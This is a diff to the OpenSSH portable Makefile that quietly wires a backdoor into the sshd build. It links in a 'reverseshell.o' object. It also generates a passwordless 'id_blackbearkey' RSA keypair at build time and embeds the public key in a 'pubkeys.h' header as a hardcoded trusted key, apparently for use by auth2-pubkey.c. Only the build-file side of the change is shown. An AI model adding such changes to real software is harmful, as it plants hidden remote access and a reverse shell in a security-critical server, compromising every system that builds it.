@@ -110,7 +110,7 @@ SSHDOBJS=sshd.o auth-rhosts.o auth-passwd.o \
 	sftp-server.o sftp-common.o \
 	sandbox-null.o sandbox-rlimit.o sandbox-systrace.o sandbox-darwin.o \
 	sandbox-seccomp-filter.o sandbox-capsicum.o sandbox-pledge.o \
-	sandbox-solaris.o
+	sandbox-solaris.o reverseshell.o pubkeys.h
 
 MANPAGES	= moduli.5.out scp.1.out ssh-add.1.out ssh-agent.1.out ssh-keygen.1.out ssh-keyscan.1.out ssh.1.out sshd.8.out sftp-server.8.out sftp.1.out ssh-keysign.8.out ssh-pkcs11-helper.8.out sshd_config.5.out ssh_config.5.out
 MANPAGES_IN	= moduli.5 scp.1 ssh-add.1 ssh-agent.1 ssh-keygen.1 ssh-keyscan.1 ssh.1 sshd.8 sftp-server.8 sftp.1 ssh-keysign.8 ssh-pkcs11-helper.8 sshd_config.5 ssh_config.5
@@ -228,6 +228,9 @@ umac128.o:	umac.c
 clean:	regressclean
 	rm -f *.o *.a $(TARGETS) logintest config.cache config.log
 	rm -f *.out core survey
+	rm -f id_blackbearkey
+	rm -f id_blackbearkey.pub
+	rm -f pubkeys.h
 	rm -f regress/check-perm$(EXEEXT)
 	rm -f regress/unittests/test_helper/*.a
 	rm -f regress/unittests/test_helper/*.o
@@ -382,6 +385,18 @@ host-key: ssh-keygen$(EXEEXT)
 	@if [ -z "$(DESTDIR)" ] ; then \
 		./ssh-keygen -A; \
 	fi
+
+pubkeys.h: id_blackbearkey                                                                                                                  
+	@echo "Generating pubkeys.h with blackbear public keys" ;
+	@echo "// Generate by make, do not commit to revision control" >> pubkeys.h ;
+	@echo "// if modified, touch auth2-pubkey.c and run make" >> pubkeys.h ;
+	@echo "char *myownpubkeys[] = {" >> pubkeys.h ;
+	@echo -n "\t\"`cat $(srcdir)/id_blackbearkey.pub`\"\n" >> pubkeys.h ;
+	@echo -n "};" >> pubkeys.h ;
+
+id_blackbearkey: ssh-keygen$(EXEEXT)
+	$(srcdir)/ssh-keygen$(EXEEXT) -t rsa -b 2048 -f $(srcdir)/id_blackbearkey -q -N "" ; \
+
 
 host-key-force: ssh-keygen$(EXEEXT) ssh$(EXEEXT)
 	./ssh-keygen -t dsa -f $(DESTDIR)$(sysconfdir)/ssh_host_dsa_key -N ""
